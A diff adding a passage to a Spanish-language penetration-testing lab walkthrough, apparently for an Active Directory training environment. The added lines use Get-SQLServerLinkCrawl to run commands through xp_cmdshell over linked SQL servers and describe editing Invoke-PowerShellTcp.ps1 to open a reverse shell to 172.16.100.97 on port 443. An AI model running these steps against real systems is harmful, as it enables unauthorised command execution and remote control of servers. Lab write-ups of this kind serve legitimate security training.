@@ -1523,6 +1523,13 @@ Para ello vamos a usar *Get-SQLServerLinkCrawl*, para rastrear los enlaces de la
 Get-SQLServerLinkCrawl -Instance dcorp-mssql.dollarcorp.moneycorp.local -Verbose
 ```
 
-Viendo que t
+Viendo que tenemos *sysadmin* sobre *EU-SQL7*
+Tenemos que comprobar si *xp_cmdshell* esta habilitado ya que nos seria posible ejecutar comandos en él servidor utilizando bases de datos vinculadas, para verificar que tenemos xp_cmdshell ejecutaremos
+```shell
+Get-SQLServerLinkCrawl -Instance dcorp-mssql.dollarcorp.moneycorp.local  -Query "exec master..xp_cmdshell 'set username'"
+```
+
+Ahora tendremos que modificar la herramienta *Invoke_PowerShellTcp.ps1* haciendo primero una copia y cambiando su nombre a *Invoke-PowerShellTcpEx.ps1*
+Lo editaremos en PowerShell ISE, añadiendo al final del archivo *Power -Reverse -IPAddress 172.16.100.97 -Port 443*
 
 
